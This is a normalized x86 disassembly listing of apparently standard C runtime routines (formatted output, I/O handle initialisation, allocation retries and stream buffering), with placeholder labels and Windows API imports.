and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_412ade
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_4139ac
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_412b11
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_412ade
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_412b35
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ esp + 0xc ]
mov ecx edi
call sub_412ade
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esp + 0xc ]
add [ esi ] eax
jmp r-xdata
call sub_412089
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_412ade
sub_412b7f
push ebp
lea ebp [ esp - 0x1f8 ]
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
mov eax [ ebp + 0x200 ]
push ebx
mov ebx [ ebp + 0x204 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0x20c ]
push [ ebp + 0x208 ]
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x44 ] esi
call sub_410556
cmp [ ebp - 0x30 ] esi
jne r-xdata
mov eax [ ebp - 0x30 ]
test [ eax + 0xc ] 0x40
jne r-xdata
call sub_412089
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
cmp ebx esi
je r-xdata
push eax
call sub_40ebab
cmp eax 0xffffffff
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x5c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
xor ecx ecx
test dl dl
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x19 ] dl
je r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_40ebab
cmp eax 0xfffffffe
pop ecx
je r-xdata
mov ecx [ ebp + 0x1f4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
add ebp 0x1f8
leave
retn
cmp [ ebp - 0x58 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x34 ] 0x0
mov [ ebp - 0x48 ] ebx
jl r-xdata
push [ ebp - 0x30 ]
call sub_40ebab
cmp eax 0xffffffff
pop ecx
je r-xdata
push [ ebp - 0x30 ]
call sub_40ebab
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_40ebab
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x5c ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_40ebab
cmp eax 0xfffffffe
pop ecx
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
push [ ebp - 0x30 ]
call sub_40ebab
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_40ebab
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
mov ebx [ ebp - 0x48 ]
mov al [ ebx ]
test al al
mov [ ebp - 0x19 ] al
je r-xdata
jmp [ eax * 4 + jump_table_4134f7 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
cmp eax ecx
mov [ ebp - 0x74 ] eax
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x74 ]
mov edi [ ebp - 0x2c ]
mov dl al
jmp r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x44 ] esi
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
movzx eax dl
push eax
mov [ ebp - 0x44 ] esi
call sub_419d2c
pop ecx
test eax eax
mov al [ ebp - 0x19 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x18 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
cmp edi esi
mov [ ebp - 0x40 ] edi
jge r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
cmp edi esi
mov [ ebp - 0x20 ] edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_412ade
jmp r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_412ade
mov al [ ebx ]
inc ebx
test al al
mov [ ebp - 0x48 ] ebx
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x18 ] 0x4
neg [ ebp - 0x40 ]
jmp r-xdata
or [ ebp - 0x20 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x18 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
call sub_412089
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x18 ] 0x8000
mov [ ebp - 0x48 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
call sub_41202a
add esp 0x14
cmp [ ebp - 0x58 ] 0x0
je r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x20 ] 0x8
cmp eax 0x65
jl r-xdata
test cx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x18 ] 0xffff7fff
mov [ ebp - 0x48 ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x18 ] 0x1000
mov [ ebp - 0x48 ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x24 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x28 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] 0x10
je r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x18 ] 0x8
jmp r-xdata
cmp al 0x6f
je r-xdata
cmp edi esi
jne r-xdata
cmp edi esi
jne r-xdata
mov [ ebp - 0x4c ] 0x27
mov ecx [ ebp - 0x18 ]
test cx cx
jns r-xdata
mov al [ ebp - 0x4c ]
add al 0x51
mov [ ebp - 0x38 ] 0x30
mov [ ebp - 0x37 ] al
mov [ ebp - 0x3c ] 0x2
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
test al 0x40
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp [ ebp - 0x20 ] esi
lea ebx [ ebp - 0x14 ]
mov eax 0x200
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x68 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test cl 0x40
mov eax [ edi - 0x4 ]
je r-xdata
test cl 0x40
mov [ ebp - 0x2c ] edi
je r-xdata
test [ ebp - 0x18 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
cmp edx esi
jg r-xdata
mov eax [ edi ]
add edi 0x4
cmp eax esi
mov [ ebp - 0x2c ] edi
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x18 ] 0x800
add dl 0x20
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x19 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x54 ]
call sub_40fdab
and [ ebp - 0x54 ] 0x0
pop ecx
mov ebx [ ebp - 0x40 ]
sub ebx [ ebp - 0x28 ]
sub ebx [ ebp - 0x3c ]
test [ ebp - 0x18 ] 0xc
jne r-xdata
test ax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x20 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push eax
mov ecx [ eax + 0x4 ]
cmp ecx esi
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
cmp ecx esi
jne r-xdata
cmp ecx esi
jne r-xdata
push [ ebp - 0x3c ]
mov edi [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x38 ]
call sub_412b35
test [ ebp - 0x18 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push ebx
push 0x20
call sub_412b11
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x38 ] 0x2d
jmp r-xdata
cmp [ ebp - 0x20 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x80 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x78 ]
movsx eax dl
push [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edi
push eax
push [ ebp - 0x68 ]
lea eax [ ebp - 0x80 ]
push ebx
push eax
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
mov edi [ ebp - 0x18 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x2c ] edi
call sub_410257
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x18 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x20 ] eax
jle r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x18 ] 0x100
cmp eax esi
jae r-xdata
mov [ ebp - 0x28 ] eax
test [ ebp - 0x18 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x24 ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
je r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x24 ]
dec ecx
cmp [ eax ] si
je r-xdata
sub eax [ ebp - 0x24 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x44 ] 0x0
mov eax [ ebp - 0x28 ]
je r-xdata
test [ ebp - 0x18 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x38 ] 0x2b
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x20 ] 0xa3
jle r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
cmp [ ebp - 0x19 ] 0x67
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
test [ ebp - 0x18 ] 0x20
je r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x44 ] esi
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x14 ] al
mov [ ebp - 0x28 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_419d11
add esp 0x10
test eax eax
je r-xdata
mov [ ebp - 0x74 ] esi
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
call sub_412b35
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x34 ]
call sub_412b11
add esp 0xc
mov [ ebp - 0x38 ] 0x20
mov esi [ ebp - 0x20 ]
add esi 0x15d
push esi
call sub_413757
test eax eax
mov dl [ ebp - 0x19 ]
pop ecx
mov [ ebp - 0x54 ] eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp edi esi
jne r-xdata
lea eax [ ebp - 0x64 ]
push eax
push ebx
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x34 ]
mov [ esi ] eax
mov ax [ ebp - 0x34 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x18 ] 0x200
jmp r-xdata
lea esi [ ebp + 0x1eb ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
test [ ebp - 0x18 ] 0x4
je r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x20 ] 0xa3
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x68 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x100
inc ebx
mov [ ebp - 0x24 ] ebx
lea eax [ ebp - 0x64 ]
push eax
push ebx
push [ rw-data ]
call sub_4116dd
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x50 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x28 ]
cdq
push edx
push eax
push ebx
push edi
call sub_419d70
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x68 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x34 ]
call sub_412b11
add esp 0xc
or [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x70 ] eax
je r-xdata
xor esi esi
call sub_415b90
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x4c ]
lea eax [ ebp + 0x1eb ]
sub eax esi
inc esi
test [ ebp - 0x18 ] 0x200
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jl r-xdata
push [ ebp - 0x70 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp + 0x1ec ]
call sub_412b35
cmp [ ebp - 0x68 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x20 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x68 ]
push eax
push 0x6
lea eax [ ebp + 0x1ec ]
push eax
lea eax [ ebp - 0x70 ]
inc esi
push eax
inc esi
call sub_419d11
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x24 ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_413517
push 0x54
push r--data
call sub_412340
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x28
push 0x20
pop esi
push esi
call sub_413797
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x500 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov ecx [ rw-data ]
add ecx 0x500
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
xor esi esi
inc esi
jmp r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
imul esi esi 0x28
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x28
push 0x20
call sub_413797
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_412385
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
lea ecx [ esi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x500 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_412928
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
add eax 0x28
mov edx [ ecx ]
add edx 0x500
inc esi
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
imul esi esi 0x28
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_412928
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_413757
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_40fe88
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_413797
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_419e05
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4137df
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41026d
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
sub_41382a
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x14 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_410488
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_41387a
push 0x10
push r--data
call sub_412340
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413910
mov eax [ ebp - 0x1c ]
call sub_412385
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40f0ed
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_40fdab
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_413938
mov eax [ rw-data ]
cmp eax 0xffffffff
push esi
mov esi [ CloseHandle@IAT ]
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_4139ac
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40ebab
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
test al 0x82
pop ecx
jne r-xdata
test al 0x40
je r-xdata
call sub_412089
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_412089
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40e4b7
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_4148eb
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_419b54
test eax eax
pop ecx
jne r-xdata
call sub_40e4b7
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_4148eb
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4151b2
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_415406
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
imul eax eax 0x28
mov edx ecx
sar edx 0x5
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_413b0c
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_412089
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_4151b2
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40ebab
pop ecx
push eax
call sub_4141ce
add esp 0xc
cmp eax edi
mov [ esi + 0x4 ] eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40ebab
cmp eax 0xffffffff
pop ecx
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
